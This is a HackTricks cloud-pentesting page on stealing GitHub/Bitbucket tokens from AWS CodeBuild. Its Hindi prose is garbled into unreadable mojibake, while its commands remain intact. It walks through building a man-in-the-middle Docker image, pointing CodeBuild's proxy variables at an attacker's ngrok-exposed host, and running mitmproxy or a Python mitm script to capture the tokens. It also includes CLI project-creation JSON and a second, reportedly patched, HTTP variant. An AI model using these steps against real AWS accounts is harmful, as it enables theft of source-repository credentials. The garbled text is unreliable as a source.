# AWS Codebuild - рдЯреЛрдХрди рд▓реАрдХреЗрдЬ

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## Github/Bitbucket рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдЯреЛрдХрдиреНрд╕ рдХреА рдкреБрдирдГ рдкреНрд░рд╛рдкреНрддрд┐

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реЛрд░реНрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
aws codebuild list-source-credentials
```
### рдбреЙрдХрд░ рдЗрдореЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Github рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЦрд╛рддреЗ рдореЗрдВ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЖрдк **access** (**GH token рдпрд╛ OAuth token**) рдХреЛ **exfiltrate** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ Codebuild рдХреЛ рд╡рд┐рд╢реЗрд╖ рдбреЙрдХрд░ рдЗрдореЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдк рдПрдХ рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ **create** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдореМрдЬреВрджрд╛ рдХреЗ **environment** рдХреЛ рдмрджрд▓рдХрд░ **Docker image** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдЬрд┐рд╕ Docker рдЗрдореЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ред рдпрд╣ рдПрдХ рдмрд╣реБрдд рд╣реА рдмреБрдирд┐рдпрд╛рджреА Docker рдЗрдореЗрдЬ рд╣реИ рдЬреЛ **env variables `https_proxy`**, **`http_proxy`** рдФрд░ **`SSL_CERT_FILE`** рд╕реЗрдЯ рдХрд░реЗрдЧреАред рдЗрд╕рд╕реЗ рдЖрдк **`https_proxy`** рдФрд░ **`http_proxy`** рдореЗрдВ рджрд┐рдП рдЧрдП рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **`SSL_CERT_FILE`** рдореЗрдВ рджрд┐рдП рдЧрдП SSL CERT рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

1. **рдЕрдкрдиреА рдЦреБрдж рдХреА Docker MitM рдЗрдореЗрдЬ рдмрдирд╛рдПрдВ рдФрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ**
* рд░реЗрдкреЛ рдХреЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА IP рдкрддреЗ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЕрдкрдиреЗ SSL рд╕рд░реНрдЯ рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ **build the docker image**ред
* **`http_proxy`** рд╕реЗрдЯ рди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдЖрдк **`ngrok`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ `ngrok tcp 4444` рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ Docker рдЗрдореЗрдЬ рдмрди рдЬрд╛рдП, рддреЛ рдЗрд╕реЗ рдХрд┐рд╕реА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реЗрдкреЛ (Dockerhub, ECR...) рдореЗрдВ **upload** рдХрд░реЗрдВред
2. **environment рд╕реЗрдЯ рдХрд░реЗрдВ**
* рдПрдХ **рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ** рдмрдирд╛рдПрдВ рдпрд╛ рдореМрдЬреВрджрд╛ рдХреЗ environment рдХреЛ **modify** рдХрд░реЗрдВред
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рдЬрдирд░реЗрдЯ рдХреА рдЧрдИ Docker рдЗрдореЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░реЗрдВред

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ MitM рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд░реЗрдВ**

* **Github рд░реЗрдкреЛ** рдореЗрдВ рдмрддрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxy рд╕рдВрд╕реНрдХрд░рдг рдЬреЛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рд╡рд╣ 9.0.1 рдерд╛**, рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рд╕рдВрд╕реНрдХрд░рдг 10 рдХреЗ рд╕рд╛рде рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

4. **рдмрд┐рд▓реНрдб рдЪрд▓рд╛рдПрдВ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ**

*   рдЖрдк **Authorization** рд╣реЗрдбрд░ рдореЗрдВ рдЯреЛрдХрди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ aws cli рдХреЗ рд╕рд╛рде рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ~~

{% hint style="success" %}
**рдпрд╣ рдХрдордЬреЛрд░реА AWS рджреНрд╡рд╛рд░рд╛ 20 рдлрд░рд╡рд░реА 2023 рдХреЗ рд╕рдкреНрддрд╛рд╣ рдореЗрдВ рдХрд┐рд╕реА рд╕рдордп рд╕рд╣реА рдХрд░ рджреА рдЧрдИ рдереА (рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рд╢реБрдХреНрд░рд╡рд╛рд░ рдХреЛ)ред рдЗрд╕рд▓рд┐рдП рдЕрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ :)**
{% endhint %}

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **CodeBuild рдореЗрдВ рдЙрдЪреНрдЪ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, Github/Bitbucket рдЯреЛрдХрди рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдЧрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдВ OAuth рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рдереАрдВ, рддреЛ **рдХреЛрдб рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЕрд╕реНрдерд╛рдпреА OAuth рдЯреЛрдХрди**ред

* рдПрдХ рд╣рдорд▓рд╛рд╡рд░ CodeBuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ **http\_proxy** рдФрд░ **https\_proxy** рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдорд╢реАрди рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* рдлрд┐рд░, github рд░реЗрдкреЛ рдХреЗ URL рдХреЛ HTTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTPS рдХреЗ рдмрдЬрд╛рдп рдмрджрд▓реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* рдлрд┐рд░, рдкреНрд░реЙрдХреНрд╕реА рдЪрд░ (http\_proxy рдФрд░ https\_proxy) рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдкреЛрд░реНрдЯ рдкрд░ [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) рд╕реЗ рдмреЗрд╕рд┐рдХ рдЙрджрд╛рд╣рд░рдг рдЪрд▓рд╛рдПрдВ
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* рдЕрдВрдд рдореЗрдВ, **Build the project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, **credentials** рд╕реНрдкрд╖реНрдЯ рдкрд╛рда (base64) рдореЗрдВ mitm рдкреЛрд░реНрдЯ рдкрд░ **рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ**:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдЕрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛, рд╕рднреА рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХреЗрдЧрд╛ рдФрд░ CodeBuild рд╕реЗрд╡рд╛ рдХрд╛ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ (рджреБрд░реБрдкрдпреЛрдЧ) рдХрд░ рд╕рдХреЗрдЧрд╛ред
{% endhint %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
